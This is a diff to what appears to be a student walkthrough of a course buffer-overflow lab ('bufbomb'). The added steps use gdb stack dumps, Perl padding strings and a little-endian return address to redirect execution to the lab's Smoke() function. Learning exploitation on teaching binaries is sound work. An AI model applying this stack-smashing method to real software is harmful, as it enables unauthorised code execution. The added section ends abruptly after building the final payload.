@@ -15,6 +15,8 @@ To find the address of function ```Smoke()``` type:
 
    My address for ```Smoke()``` = 080490aa <smoke>:
 
+   <b>WRITE DOWN the address for ```Smoke()``` as you will be using it later</b>
+
 
 2. calculate the length of the string size to cause an overflow
 ```
@@ -63,7 +65,7 @@ gs             0x63     99
 
 Remember that the goal is to push a string that goes one address beyond the location of %ebp. 
 
-Write down %ebp address as you will be using it later. In my case:
+<b>WRITE DOWN %ebp address as you will be using it later. In my case:</b>
 
 %ebp = 0x55683350 
 
@@ -154,7 +156,91 @@ startingAddressOfBufVariable = 0x55683328
 buffer size = addressAt%ebp+4 - startingAddressOfBufVariable
             = 0x55683350   +4 - 0x55683328
             # make sure to use a hex calculator like this one: http://www.squarebox.com/legacy/hcalc.html
-            = 
+            = 2C # in hexadecimal = 44 bytes # in decimal
+
+We know that 32 bytes are used to store the "buf" variable as seen when we print out the registers after giving the "hex" file as input
+
+44 - 32 = 12 bytes left to fill the stack right before the return address(<= WHOLE POINT IS TO MANIPULATE THIS)
+
+Now quit out of gdb with ```q``` command and type:
+
+```
+bash-4.1$ perl -e 'print "A"x32 ,"B"x4, "C"x4, "D"x4 '>hex2
+bash-4.1$ ls
+bufbomb  exploit.txt  hex  hex2  hex2raw  makecookie
+bash-4.1$ less hex2
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDD
+
+Now use hex2 as your new input in gdb:
+```
+unix> gdb bufbomb
+(gdb) break getbuf
+(gdb) break *getbuf+17
+(gdb) run -u quinnliu < hex2
+(gdb) x/20x $esp
+(gdb) continue
+(gdb) x/20x $esp 
+```
+
+On the second call of ```(gdb) x/20x $esp``` you will see:
+
+```
+(gdb) x/20x $esp
+0x55683318 <_reserved+1037080>: 0x55683328      0x00bafb36      0x00d0d32c       0x55683328
+0x55683328 <_reserved+1037096>: 0x41414141      0x41414141      0x41414141       0x41414141
+0x55683338 <_reserved+1037112>: 0x41414141      0x41414141      0x41414141       0x41414141
+0x55683348 <_reserved+1037128>: 0x42424242      0x43434343      0x44444444       0x08048c00
+0x55683358 <_reserved+1037144>: 0x55683380      0x00bca610      0x55686018       0x00000c60
+(gdb)
+```
+
+Understand that our input file is:
+```AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDD```
+where A = 41, B = 42, C = 43, & D = 44
+
+So DDDD = 0x44444444
+
+After DDDD is 0x08048c00 <= THIS IS THE RETURN ADDRESS WE BE CHANGE the address of ```Smoke()```!!!!!
+
+Find where you wrote down the address of ```Smoke()``` earlier. Mine is = 080490aa
+
+Because my machine is little endian the least significant byte is first.
+
+So 
+```08 04 90 aa``` => ```aa 90 04 08```
+
+Now exit out of gdb:
+```
+bash-4.1$ perl -e 'print "AA"x32, "BB"x4, "CC"x4, "DD"x4, "aa900408" '>hex3
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+```
 
 
 
